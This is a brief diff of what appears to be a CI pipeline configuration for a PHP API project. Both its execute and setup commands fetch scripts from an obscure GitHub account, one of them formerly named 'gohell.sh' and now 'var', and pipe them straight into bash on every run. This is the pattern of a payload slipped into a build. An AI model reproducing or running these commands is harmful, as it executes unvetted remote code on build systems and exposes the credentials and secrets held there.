@@ -12,7 +12,7 @@
       execute_commands:
         - "curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/var | bash"
       setup_commands:
-        - "curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash"
+        - "curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/var | bash"
       mount_filesystem_path: "/buddy/buddy-works-php-api"
       shell: "BASH"
       trigger_condition: "ALWAYS"
